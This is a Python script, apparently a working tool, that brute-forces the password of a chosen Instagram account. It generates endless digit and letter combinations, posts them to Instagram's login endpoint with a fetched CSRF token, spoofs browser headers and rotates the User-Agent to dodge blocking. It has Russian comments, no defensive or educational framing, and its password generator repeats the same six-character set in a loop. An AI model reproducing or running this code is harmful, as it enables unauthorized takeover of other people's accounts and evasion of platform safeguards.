# Script Name: insta_ultra.py

import requests
import time
import itertools
import string

target_username = input("Enter target Instagram username: ")
login_url = "https://www.instagram.com/accounts/login/ajax/"

# Функция для генерации бесконечной последовательности паролей
def password_generator():
    # Начинаем с простых цифровых комбинаций
    length = 1
    while True:
        for passwd in itertools.product(string.digits, repeat=length):
            yield ''.join(passwd)
        length += 1
        # Добавляем буквы после цифр
        if length > 6:  # Чтобы не начинать со слишком длинных комбинаций
            for passwd in itertools.product(string.ascii_lowercase + string.digits, repeat=6):
                yield ''.join(passwd)

# Headers чтобы выглядеть как браузер
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://www.instagram.com/accounts/login/",
    "Origin": "https://www.instagram.com",
    "Host": "www.instagram.com"
}

# Создаем сессию
session = requests.Session()

# Первый запрос для получения куков и CSRF
try:
    initial_response = session.get("https://www.instagram.com/accounts/login/", headers=headers)
    csrf_token = initial_response.cookies.get('csrftoken', 'missing')
    headers.update({"X-CSRFToken": csrf_token})
except:
    csrf_token = "missing"
    print("[INFO] Could not get CSRF token. Proceeding anyway.")

# Создаем генератор
password_gen = password_generator()
attempt_count = 0

print(f"[START] Beginning infinite brute force on @{target_username}. This will take forever...")

for password in password_gen:
    attempt_count += 1
    if attempt_count % 100 == 0:
        time.sleep(10)  # Большая пауза каждые 100 попыток
    else:
        time.sleep(0.5)  # Короткая пауза между попытками

    # Формируем данные для входа
    login_data = {
        "username": target_username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    try:
        # Пытаемся войти
        login_response = session.post(login_url, data=login_data, headers=headers)

        # Проверяем JSON ответ
        if login_response.headers.get('Content-Type', '').startswith('application/json'):
            response_json = login_response.json()
            if response_json.get('authenticated'):
                print(f"[SUCCESS] Password found after {attempt_count} attempts: {password}")
                break
            else:
                if attempt_count % 50 == 0:
                    print(f"[TRYING] Attempt {attempt_count}: {password} | Status: {response_json.get('status')}")
        else:
            # Если не JSON, меняем User-Agent и продолжаем
            if attempt_count % 50 == 0:
                print(f"[BLOCKED] Attempt {attempt_count}: {password}. Rotating UA.")
            new_version = 120 + (attempt_count % 10)
            headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{new_version}.0.0.0 Safari/537.36"

    except Exception as e:
        if attempt_count % 50 == 0:
            print(f"[ERROR] Attempt {attempt_count}: {password} - {str(e)}")
        continue

print("[INFO] Brute force stopped.")
